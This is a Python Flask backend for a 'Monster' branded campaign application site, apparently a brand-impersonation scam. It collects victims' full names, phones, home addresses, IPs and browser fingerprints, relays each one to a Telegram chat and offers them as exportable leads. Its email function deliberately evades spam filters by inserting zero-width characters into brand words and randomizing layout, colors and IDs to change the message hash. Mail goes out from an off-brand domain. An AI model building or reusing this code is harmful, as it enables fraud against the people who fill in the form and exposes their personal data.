import os
import json
import base64
import requests
import random
import uuid
import sib_api_v3_sdk
from sib_api_v3_sdk.rest import ApiException
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template, redirect, url_for, flash, Response
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_admin import Admin
from flask_admin.contrib.sqla import ModelView
from dotenv import load_dotenv
from flask_talisman import Talisman
from flask_compress import Compress

# Load environment variables
load_dotenv()

# --- Configuration from Brevo/Env ---
SECRET_KEY = os.getenv("SECRET_KEY")
DATABASE_URL = os.getenv("DATABASE_URL")
BREVO_API_KEY = os.getenv("BREVO_API_KEY")
NOTIFY_EMAIL = os.getenv("NOTIFY_EMAIL")
FROM_EMAIL = os.getenv("FROM_EMAIL")
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")
RECAPTCHA_SECRET_KEY = os.getenv("RECAPTCHA_SECRET_KEY")

# --- Environment Variable Checks ---
if not SECRET_KEY or not DATABASE_URL or not BREVO_API_KEY:
    raise ValueError("Crucial Environment Variables (SECRET_KEY, DATABASE_URL, or BREVO_API_KEY) are missing.")

# Initialize Brevo
configuration = sib_api_v3_sdk.Configuration()
configuration.api_key['api-key'] = BREVO_API_KEY
api_instance = sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))

# --- Flask App Initialization ---
app = Flask(__name__, template_folder='templates', static_folder='static')
# 1. DEFINE THE SECURITY POLICY
csp = {
    'default-src': '\'self\'',
    'script-src': [
        '\'self\'',
        '\'unsafe-inline\'',
        '\'unsafe-eval\'',
        'https://www.google.com/recaptcha/',
        'https://www.gstatic.com/recaptcha/',
        'https://cdn.tailwindcss.com'
    ],
    'frame-src': [
        '\'self\'',
        'https://www.google.com/recaptcha/',
        'https://recaptcha.google.com/'
    ],
    'style-src': [
        '\'self\'',
        '\'unsafe-inline\'',
        'https://fonts.googleapis.com',
        'https://cdnjs.cloudflare.com'
    ],
    'font-src': [
        '\'self\'',
        'https://fonts.gstatic.com',
        'https://cdnjs.cloudflare.com'
    ],
    'img-src': ["'self'", "data:", "blob:", "*"]# Allows images from anywhere
}

# 2. APPLY THE PROTECTION (XSS Nonce)
# This generates the secret nonce you'll use in your HTML
Talisman(app, 
         content_security_policy=None, 
         force_https=False, 
         session_cookie_secure=False) 

# 3. APPLY COMPRESSION
Compress(app)
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# This line fixes the "decryption failed or bad record mac" error
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_pre_ping": True,
    "pool_recycle": 280,
}

# --- Database Initialization ---
db = SQLAlchemy(app)
migrate = Migrate(app, db)

# --- PLACE 1: THE EMAIL MACHINE (UPDATED VERSION) ---
def send_monster_email(email, full_name):
    # 1. Scramble function for bot protection
    def scramble(word):
        if not word: return ""
        if len(word) < 2: return word 
        pos = random.randint(1, len(word) - 1)
        return f"{word[:pos]}\u200b{word[pos:]}"

    # 2. Prepare the randomized data for the template
    random_data = {
        "name": full_name,
        "beast": scramble("BEAST"),
        "brand": scramble("Monster"),
        "campaign": scramble("Campaign"),
        "color": random.choice(["#66cc00", "#67cd00", "#65cb00", "#64ca00"]), # Slight color shifts
        "padding": random.randint(25, 35), # Slight layout shifts
        "uid": uuid.uuid4().hex[:6] # Unique ID to change the "File Hash"
    }

    # 3. Pulls from your new templates/email_template.html file
    try:
        html_content = render_template('email_template.html', **random_data)
    except Exception as e:
        print(f"CRITICAL ERROR: email_template.html not found! {e}")
        return
        
    short_id = uuid.uuid4().hex[:8]
    # 4. Set up the Brevo Send
    
    send_smtp_email = sib_api_v3_sdk.SendSmtpEmail(
        to=[{"email": email, "name": full_name}],
        sender={"email": "noreply@monstercampaigns.info", "name": "Campaign Support"}, 
        # Removed ® and added Unique ID to beat spam filters
        subject=f"Application ID #{short_id} - Campaign Confirmation",
        html_content=html_content
    )

    try:
        api_instance.send_transac_email(send_smtp_email)
        print(f"SUCCESS: Email sent to {email}")
    except Exception as e:
        print(f"FAILURE: Brevo error: {e}")
        
        # 2. Telegram Alert Machine
def send_telegram_alert(message):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')

    # Guard clause: Stop if keys are missing
    if not token or not chat_id:
        print("TELEGRAM ERROR: Keys not found in environment variables.")
        return

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id, 
        "text": message, 
        "parse_mode": "HTML"
    }

    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            print("SUCCESS: Telegram alert sent.")
        else:
            print(f"TELEGRAM API ERROR: {response.text}")
    except Exception as e:
        print(f"ERROR: Telegram failed: {e}")
        
        
# --- Database Model ---
class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    full_name = db.Column(db.String(100), nullable=False)
    email = db.Column(db.String(100), nullable=False)
    phone = db.Column(db.String(20), nullable=False)
    contact_method = db.Column(db.String(20), nullable=False)
    address = db.Column(db.String(200), nullable=False)
    city = db.Column(db.String(100), nullable=False)
    state = db.Column(db.String(100), nullable=False)
    zip_code = db.Column(db.String(20), nullable=False)
    age_18_plus = db.Column(db.Boolean, nullable=False)
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.String(255))
    browser_metadata = db.Column(db.Text)  
    fingerprint_id = db.Column(db.String(100))
# --- Flask-Admin Setup ---
class AuthenticatedModelView(ModelView):
# --- UI & FEATURE SETTINGS ---
    can_export = True  # Adds the button to download leads as Excel/CSV
    can_view_details = True
    column_default_sort = ('id', True) 
    column_list = [
        'id', 'full_name', 'email', 'phone', 'state', 
        'timestamp', 'ip_address', 'fingerprint_id'
    ]
    column_searchable_list = ['full_name', 'email', 'phone', 'ip_address'] # Added ip_address here too
    column_filters = ['state', 'city']  
    page_size = 100
    
    def is_accessible(self):
        auth_header = request.headers.get('Authorization')
        if not auth_header: return False
        try:
            auth_type, credentials = auth_header.split(None, 1)
            if auth_type.lower() == 'basic':
                username, password = base64.b64decode(credentials).decode('utf-8').split(':', 1)
                return username == ADMIN_USERNAME and password == ADMIN_PASSWORD
        except: pass
        return False

    def inaccessible_callback(self, name, **kwargs):
        return Response("Unauthorized.", 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})

admin = Admin(app, name='Monster Admin', template_mode='bootstrap3')
admin.add_view(AuthenticatedModelView(Submission, db.session))

# --- Routes ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/thankyou')
def thankyou_page():
    return render_template('thank_you.html')

@app.route('/sitemap.xml')
def serve_sitemap():
    return send_from_directory('static', 'sitemap.xml')

@app.route('/submit', methods=['POST'])
def submit_application():
    try:
        # 1. Capture data from form
        full_name = request.form.get('name')
        email = request.form.get('email')
        phone = request.form.get('phone')
        contact_method = request.form.get('contact_method')
        address = request.form.get('address')
        city = request.form.get('city')
        state = request.form.get('state')
        zip_code = request.form.get('zip')
        age_check = request.form.get('age') 
        recaptcha_response = request.form.get('g-recaptcha-response')
        ua = request.form.get('user_agent')
        meta = request.form.get('browser_metadata')
        fp = request.form.get('fingerprint_id')
        
        # Capture the IP Address
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip = request.remote_addr
        # 2. reCAPTCHA Verification
        recaptcha_verify_url = "https://www.google.com/recaptcha/api/siteverify"
        recaptcha_req = requests.post(recaptcha_verify_url, data={
            'secret': RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response,
            'remoteip': ip
        })
        if not recaptcha_req.json().get('success'):
            return "reCAPTCHA failed. Please go back and try again.", 400
            
        uid = str(uuid.uuid4())
        short_id = uid[:8]

        # 3. Save to Database
        # Note: We convert age_check to a Boolean (True/False) for the database
        new_submission = Submission(
            full_name=full_name, 
            email=email, 
            phone=phone,
            contact_method=contact_method, 
            address=address,
            city=city, 
            state=state, 
            zip_code=zip_code, 
            age_18_plus=(age_check == 'yes'),
            ip_address=ip,
            user_agent=ua,
            browser_metadata=meta,
            fingerprint_id=fp
        )
        db.session.add(new_submission)
        db.session.commit()

        # 4. Prepare Email Data
        template_data = {
            'name': full_name,
            'brand': 'Monster',
            'uid': uid,
            'color': '#00ff00'
        }
        
        # It picks the 'email' and 'full_name' from Step 1
        send_monster_email(email, full_name)

        # Send alert to YOUR Telegram (Place this here!)
        alert_text = (
            f"<b>🔥 NEW APPLICATION MONSTER!</b>\n\n"
            f"---------------------------\n"
            f"<b>👤 Name:</b> {full_name}\n"
            f"<b>📧 Email:</b> {email}\n"
            f"<b>📞 Phone:</b> {phone}\n"
            f"<b>💬 Preferred Contact:</b> {contact_method}\n"
            f"<b>🏠 Address:</b>\n"
            f"{address}\n"
            f"{city}, {state} {zip_code}\n"
            f"<b>🔞 18+ Verified:</b> {age_check}\n"
            f"---------------------------\n"
            f"<i>Check the Admin Panel for full history.</i>"
        )
        send_telegram_alert(alert_text)
        return render_template('thank_you.html')

    except Exception as e:
        db.session.rollback()
        print(f"CRITICAL ERROR: {e}")
        return "Internal Server Error", 500

# --- Database Creation & App Run ---
with app.app_context():
    try:
        db.create_all()
        print("[INFO] Database tables checked/created.")
    except Exception as e:
        print(f"[ERROR] Database creation failed: {e}")
